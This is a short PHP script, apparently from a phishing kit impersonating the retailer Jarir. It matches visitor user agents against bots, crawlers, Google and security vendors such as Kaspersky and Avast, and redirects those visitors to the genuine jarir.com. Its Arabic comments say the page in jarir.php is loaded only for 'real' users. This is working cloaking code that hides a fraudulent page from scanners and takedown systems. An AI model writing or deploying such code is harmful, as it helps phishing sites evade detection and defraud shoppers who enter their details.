<?php
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
// حظر البوتات والشركات الأمنية وتحويلهم لجرير الأصلي
if (preg_match('/(bot|crawl|spider|security|virus|phish|google|kaspersky|avast)/i', $ua)) {
    header("Location: https://www.jarir.com/");
    exit();
}
// إذا كان المستخدم حقيقياً، يتم تحميل الصفحة
include('jarir.php'); 
?>
